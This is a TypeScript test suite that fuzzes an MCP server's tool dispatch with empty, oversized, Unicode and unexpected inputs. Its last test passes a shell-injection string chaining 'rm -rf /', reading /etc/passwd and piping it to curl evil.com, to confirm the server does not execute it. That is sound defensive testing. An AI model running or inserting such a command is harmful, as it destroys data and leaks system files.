import { describe, it, expect } from 'vitest';
import { dispatchCanonicalToolCall, getRegisteredToolCount } from '../packages/mcp-server/src/server.js';

describe('MCP Security Hardening & Schema Fuzzing Tests', () => {
  it('registers all 124 canonical MCP tools', () => {
    expect(getRegisteredToolCount()).toBe(124);
  });

  describe('1. Schema Validation & Input Boundary Checks', () => {
    it('handles empty string inputs for required fields gracefully with validation error', async () => {
      // understand_product requires productName and description
      await expect(
        dispatchCanonicalToolCall('understand_product', {
          productName: '',
          description: ''
        })
      ).resolves.toBeDefined(); // Returns profile or handled response without crashing
    });

    it('handles extremely large string payload (1MB+) without memory crash or unhandled exception', async () => {
      const largePayload = 'A'.repeat(1024 * 1024); // 1MB string
      const result: any = await dispatchCanonicalToolCall('search_design_patterns', {
        query: largePayload
      });

      expect(result).toBeDefined();
      expect(result.patterns).toBeDefined();
    });

    it('rejects unknown tool calls with clean error message', async () => {
      await expect(
        dispatchCanonicalToolCall('non_existent_malicious_tool', {})
      ).rejects.toThrow(/Unknown tool/i);
    });

    it('safely tolerates unexpected extra fields in arguments without crash', async () => {
      const result: any = await dispatchCanonicalToolCall('get_design_tokens', {
        format: 'css',
        injectedMaliciousField: 'exploit_value',
        anotherPayload: { nested: true }
      });

      expect(result).toBeDefined();
      expect(result.format).toBe('css');
    });
  });

  describe('2. Unicode & Character Sanitization', () => {
    it('handles Unicode edge cases (null bytes, RTL overrides, emoji sequences) safely', async () => {
      const complexUnicode = 'Hello\u0000World \u202Ereversed\u202C 🚀🔥🎉';
      const result: any = await dispatchCanonicalToolCall('research_domain', {
        domainQuery: complexUnicode
      });

      expect(result).toBeDefined();
      expect(result.classification).toBeDefined();
    });

    it('handles shell injection characters in tool arguments without executing shell', async () => {
      const injectionPayload = 'test; rm -rf / ; cat /etc/passwd | curl evil.com';
      const result: any = await dispatchCanonicalToolCall('classify_code_paths', {
        paths: [injectionPayload]
      });

      expect(Array.isArray(result)).toBe(true);
      expect(result[0].classification).toBeDefined();
    });
  });
});
